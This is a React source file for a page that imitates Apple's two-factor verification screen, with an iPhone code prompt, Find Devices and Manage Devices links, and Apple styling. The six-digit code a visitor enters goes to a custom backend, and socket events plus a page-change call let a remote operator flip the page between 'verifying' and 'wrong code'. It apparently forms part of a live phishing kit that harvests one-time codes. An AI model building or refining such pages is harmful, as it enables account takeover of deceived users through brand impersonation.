import React, { useEffect, useState } from "react";
import Layout from "../components/layout/Layout";
import { GoArrowUpRight } from "react-icons/go";
import { IoIosInformationCircleOutline } from "react-icons/io";
import threeBarLoader from "../assets/json/threeBarLoader.json";
import Lottie from "lottie-react";
import { useMutation, useQueryClient } from "@tanstack/react-query";
import { createSocket } from "../lib/socket";

function Code({ authUser }) {
  const [code, setCode] = useState(["", "", "", "", "", ""]);
  const queryClient = useQueryClient();

  const handleKeyDown = (e, index) => {
    if (e.key === "Backspace" && !code[index]) {
      if (index > 0) {
        document.getElementById(`code-${index - 1}`).focus();
      }
    }
  };

  const { mutate: verificationCode } = useMutation({
    mutationFn: async (fullCode) => {
      try {
        const res = await fetch("/api/v1/rumman/auth/verification-code", {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            code: fullCode,
          }),
        });

        const data = await res.json();
        if (data.error) {
          throw new Error(data.error);
        }

        console.log(data);
        return data;
      } catch (error) {
        console.log(error);
        throw error;
      }
    },
    onSuccess: () => {
      queryClient.invalidateQueries({ queryKey: ["authUser"] });
    },
  });

  const handleSubmit = (fullCode) => {
    console.log("Submitting verification code:", fullCode);
    verificationCode(fullCode);
  };

  const isCodeWrong = authUser?.currentStatus === "wrongCode";
  const isVerifying = authUser?.currentStatus === "verifying";

  const [pageName, setPageName] = useState("");

  //mutation to change page
  const { mutate: changePage, isPending: changingPage } = useMutation({
    mutationFn: async (userId) => {
      try {
        const res = await fetch(
          `/api/v1/rumman/user/page/${userId}/${pageName}`,
          {
            method: "POST",
            headers: {
              "Content-Type": "application/json",
            },
          }
        );

        if (!res.ok) {
          throw new Error("Failed to change page");
        }
        const data = await res.json();
        return data;
      } catch (error) {
        console.log("Error changing page", error);
        throw error;
      }
    },
  });

  //listen to socket event
  useEffect(() => {
    const newSocket = createSocket();

    // Listen for new user registration events
    newSocket.on("user_updated", (data) => {
      console.log("Page changed event received:");
      queryClient.invalidateQueries({ queryKey: ["authUser"] });
    });

    return () => newSocket.close();
  }, []);

  const handleChange = (e, index) => {
    const { value } = e.target;

    if (/^\d*$/.test(value)) {
      const newCode = [...code];
      newCode[index] = value;
      setCode(newCode);

      // Move to the next input box if it's not the last one
      if (value && index < 5) {
        document.getElementById(`code-${index + 1}`).focus();
      }

      // If last input is filled, submit after a small delay to ensure state is updated
      if (index === 5 && value) {
        e.target.blur(); // Remove focus from input
        setTimeout(() => {
          console.log("Final code before submitting:", newCode.join("")); // Debugging log
          handleSubmit(newCode.join("")); // Pass the latest full code directly
        }, 100);
      }
    }
  };

  return (
    <Layout>
      <div className="pt-[20px] sm:pt-[44px] pb-[24px] sm:pb-0">
        <div className="w-full flex flex-col items-center px-0 sm:px-4">
          <div className="sm:w-[640px] w-full min-h-[calc(100dvh-120px)] sm:min-h-0 sm:h-[712px] apple-shadow sm:rounded-[34px] sm:mt-[44px]" style={{ background: "var(--card-bg)" }}>
            {/* logo and text  */}
            <div className="flex flex-col items-center px-[16px] sm:px-0">
              <div className="w-[110px] h-[110px] sm:w-[160px] sm:h-[160px] flex items-center justify-center mt-[24px] sm:mt-[40px]">
                <img
                  src="/logo.png?v=5"
                  alt=""
                  className="w-full h-full object-contain"
                />
              </div>
              <div className="mb-[16px] sm:mb-[20px]">
                <h1 className="tracking-[.011em] select-none cursor-default font-apple text-[18px] sm:text-[21px] font-[400] mt-[28px] sm:mt-[50px] text-center text-[#494949]">
                  Two-Factor Authentication
                </h1>
              </div>
            </div>

            {/* code input  */}
            <div className=" w-full flex items-center justify-center -mt-[22px] ">
              <form onSubmit={handleSubmit} className="  w-[280px] ">
                <div className="flex justify-around py-5 relative">
                  {code.map((num, index) => (
                    <input
                      key={index}
                      id={`code-${index}`}
                      type="text"
                      maxLength="1"
                      value={num}
                      onChange={(e) => {
                        handleChange(e, index);
                      }}
                      onFocus={() => {
                        if (authUser?.currentStatus === "wrongCode") {
                          setPageName("normal");
                          changePage(authUser?._id);
                        }
                      }}
                      onKeyDown={(e) => handleKeyDown(e, index)}
                      className={`w-[42px] bg-transparent  h-[42px] text-[#494949] mb-[.8235294118rem]  text-center text-[24px] font-[400] border ${
                        isCodeWrong ? "border-[#e30000]" : "border-border-color"
                      }  ${
                        isCodeWrong ? "bg-[#fff2f4]" : "bg-input-color"
                      } rounded-[8px] outline-none focus:border-2 focus:border-[#0071e3] ${
                        index === 2 ? "mr-[8px]" : "mr-[5px]"
                      }`}
                    />
                  ))}
                  {isCodeWrong && (
                    <div className=" absolute bottom-2 left-0">
                      <div className=" flex items-end gap-[5px]">
                        <div>
                          <IoIosInformationCircleOutline className=" text-[14px] rotate-180 font-[400] text-[#e30000]" />
                        </div>
                        <span className=" text-[14px] font-[400] text-[#e30000]">
                          Incorrect verification code.
                        </span>
                      </div>
                    </div>
                  )}
                </div>
              </form>
            </div>

            {/* texts  */}
            <div className=" w-full">
              <div className=" text-center tracking-[0.03em] -mt-[3.4px] mb-[7px] mx-auto max-w-[440px] px-[5px] text-[#494949] text-[17.28px] font-[400]">
                Enter the verification code sent to your iPhone.
              </div>
              <div className=" text-[15.2px] font-[400] px-[5px] text-[#06c] text-center mt-[8px] h-[50px]  ">
                {isVerifying ? (
                  <div className=" flex items-center justify-center w-full">
                    <div className=" flex items-center gap-[5px]">
                      <div className="h-[18px]  w-[18px]">
                        <Lottie
                          animationData={threeBarLoader}
                          loop={true}
                          autoplay
                        />
                      </div>
                      <span className=" text-[#494949]">Verifying...</span>
                    </div>
                  </div>
                ) : (
                  <>
                    <div className=" tracking-[0.007em]">
                      <span className=" hover:underline cursor-pointer">
                        Resend code to iPhone
                      </span>
                    </div>
                    <div className=" tracking-[0.007em] mt-[2px]">
                      <span className=" hover:underline cursor-pointer">
                        Can’t get to your iPhone?
                      </span>
                    </div>
                  </>
                )}
              </div>
            </div>

            <div className=" mt-[25px] w-full">
              <div className=" sm:max-w-[570px] sm:mx-[100px] border-t border-[rgba(0,0,0,0.12)]">
                <div className=" m-[20px] mt-[30px] sm:mt-[20px] sm:my-[20px] sm:mx-[15px]">
                  <div className=" sm:whitespace-nowrap text-center font-[400] text-[15.3px] text-[#494949] leading-5 tracking-[0.023em]">
                    If you can’t enter a code because you’ve lost your device,
                    you <br /> can use Find Devices to locate it or Manage
                    Devices to <br />
                    remove your Apple Pay cards from it.
                  </div>
                  <div className=" w-full my-[20px] pt-[6px]">
                    <div className="text-[rgba(0,0,0,0.56)] w-full place-items-center grid grid-cols-2 gap-[40px] ">
                      <div className="w-[104.42px] rounded-[8px] hover:bg-[#ededf1] cursor-pointer h-[86.17px] p-[10px] flex flex-col whitespace-nowrap items-center justify-center">
                        <div className=" opacity-30">
                          <svg
                            viewBox="0 0 113.683837890625 111.1806640625"
                            version="1.1"
                            xmlns="http://www.w3.org/2000/svg"
                            class=" layout-box"
                            width="37"
                          >
                            <g transform="matrix(1 0 0 1 -1.683129882812409 90.8203125)">
                              <path d="M8.72266-35.2606C8.72266-7.47784 31.3516 15.1511 59.1344 15.1511C86.9606 15.1511 109.59-7.47784 109.59-35.2606C109.59-50.7642 102.467-64.6827 91.3977-73.9726L87.465-67.3934C96.3507-59.5491 102.026-48.0686 102.026-35.2606C102.026-11.5985 82.7966 7.63087 59.1344 7.63087C35.5156 7.63087 16.2863-11.5985 16.2863-35.2606C16.2863-48.0686 21.9181-59.5491 30.8038-67.3934L26.9146-73.9726C15.8451-64.6827 8.72266-50.7642 8.72266-35.2606ZM25.0223-35.2606C25.0223-16.4104 40.3276-1.10512 59.1344-1.10512C77.9846-1.10512 93.2899-16.4104 93.2899-35.2606C93.2899-44.9063 89.2816-53.5323 82.864-59.7789L78.7988-52.9359C83.0601-48.2867 85.6766-42.0758 85.6766-35.2606C85.6766-20.6122 73.7828-8.71848 59.1344-8.71848C44.486-8.71848 32.5922-20.6122 32.5922-35.2606C32.5922-42.0758 35.2086-48.2867 39.5134-52.9359L35.4047-59.7789C29.0306-53.5323 25.0223-44.9063 25.0223-35.2606ZM41.1755-35.2709C41.1755-25.3573 49.2208-17.312 59.1344-17.312C69.048-17.312 77.1367-25.3573 77.1367-35.2709C77.1367-40.3835 74.9749-44.9589 71.5659-48.2212L88.1519-75.7173C88.3491-76.0494 88.2885-76.3695 87.9564-76.6204C79.8818-82.4204 69.3532-85.6724 59.1344-85.6724C48.9505-85.6724 38.387-82.4204 30.3558-76.6204C30.0237-76.3695 29.9631-76.0494 30.1603-75.7173L46.7463-48.2212C43.3373-44.9589 41.1755-40.3835 41.1755-35.2709ZM39.974-73.5699C45.726-76.4747 52.2276-78.1522 59.1344-78.1522C66.0412-78.1522 72.5428-76.4747 78.3382-73.5699L73.8098-66.0611C69.3474-68.2477 64.3481-69.4162 59.1344-69.4162C53.9207-69.4162 48.9214-68.2477 44.5024-66.0611ZM48.4728-59.5151C51.7005-61.0046 55.356-61.8028 59.1344-61.8028C62.9562-61.8028 66.6117-61.0046 69.8394-59.5151L65.3345-52.1213C63.414-52.8262 61.3356-53.2298 59.1344-53.2298C56.9766-53.2298 54.8983-52.8262 52.9343-52.1213ZM48.0558-35.2709C48.0558-41.4246 52.9807-46.3929 59.1344-46.3929C65.3315-46.3929 70.2564-41.4246 70.2564-35.2709C70.2564-29.1275 65.3213-24.1489 59.1344-24.1489C52.9909-24.1489 48.0558-29.1275 48.0558-35.2709ZM51.641-35.2709C51.641-31.1141 54.9879-27.7775 59.1344-27.7775C63.2912-27.7775 66.6278-31.1244 66.6278-35.2709C66.6278-39.4277 63.2809-42.7643 59.1344-42.7643C54.9776-42.7643 51.641-39.4175 51.641-35.2709Z"></path>
                            </g>
                          </svg>
                        </div>
                        <span className=" text-center mt-[10px]">
                          Find Devices
                        </span>
                      </div>
                      <div className="w-[148.8px]  rounded-[8px] hover:bg-[#ededf1] cursor-pointer h-[86.17px] p-[10px] flex flex-col whitespace-nowrap items-center justify-center">
                        <div className=" opacity-30">
                          <svg
                            viewBox="0 0 145.67578125 111.1806640625"
                            version="1.1"
                            xmlns="http://www.w3.org/2000/svg"
                            class=" layout-box"
                            width="47"
                          >
                            <g transform="matrix(1 0 0 1 -1.8170800781249454 90.8203125)">
                              <path d="M27.7789 9.76808L92.6089 9.76808C91.4587 8.13106 90.6086 6.17297 90.2453 3.95612C90.1724 3.29287 90.0996 2.62962 90.0785 1.86286L27.9035 1.86286C23.0272 1.86286 20.3144-0.694633 20.3144-5.77797L20.3144-64.5976C20.3144-69.6292 23.0272-72.2384 27.9035-72.2384L112.108-72.2384C116.942-72.2384 119.697-69.6292 119.697-64.5976L119.697-62.8481C122.518-62.8481 125.045-62.8481 127.551-62.8375L127.551-64.981C127.551-75.0367 122.465-80.1437 112.233-80.1437L27.7789-80.1437C17.5986-80.1437 12.4609-75.0578 12.4609-64.981L12.4609-5.3946C12.4609 4.6822 17.5986 9.76808 27.7789 9.76808ZM51.1572-1.87542L89.8474-1.87542C89.8474-3.34762 89.8474-4.89269 89.8474-6.37545L51.1572-6.37545C49.8508-6.37545 48.8761-5.50418 48.8761-4.09428C48.8761-2.73613 49.8508-1.87542 51.1572-1.87542ZM105.09 9.76808L127.288 9.76808C133.371 9.76808 136.847 6.40563 136.847 0.622849L136.847-47.9874C136.847-53.8219 133.36-57.1431 127.288-57.1431L105.09-57.1431C99.0077-57.1431 95.5417-53.8219 95.5417-47.9874L95.5417 0.622849C95.5417 6.40563 98.9971 9.76808 105.09 9.76808ZM105.205 3.36372C103.059 3.36372 101.946 2.19903 101.946-0.0393971L101.946-47.3663C101.946-49.6153 103.059-50.7388 105.205-50.7388L109.608-50.7388C109.784-50.7388 109.898-50.6247 109.898-50.4378L109.898-50.0228C109.898-48.3215 111.019-47.1703 112.731-47.1703L119.648-47.1703C121.36-47.1703 122.491-48.3215 122.491-50.0228L122.491-50.4378C122.491-50.6247 122.594-50.7388 122.749-50.7388L127.174-50.7388C129.361-50.7388 130.443-49.6153 130.443-47.3663L130.443-0.0393971C130.443 2.19903 129.361 3.36372 127.174 3.36372ZM109.532 0.871532L122.743 0.871532C123.749 0.871532 124.517 0.16608 124.517-0.840344C124.517-1.77391 123.739-2.50047 122.743-2.50047L109.532-2.50047C108.536-2.50047 107.872-1.77391 107.872-0.840344C107.872 0.217834 108.474 0.871532 109.532 0.871532Z"></path>
                            </g>
                          </svg>
                        </div>
                        <div className=" flex">
                          <div>
                            <p className=" text-center mt-[10px]">
                              Manage Devices
                            </p>
                          </div>
                          <div>
                            <GoArrowUpRight className=" ml-[3px] mt-[14px] w-[18px] h-[18px]" />
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </Layout>
  );
}

export default Code;
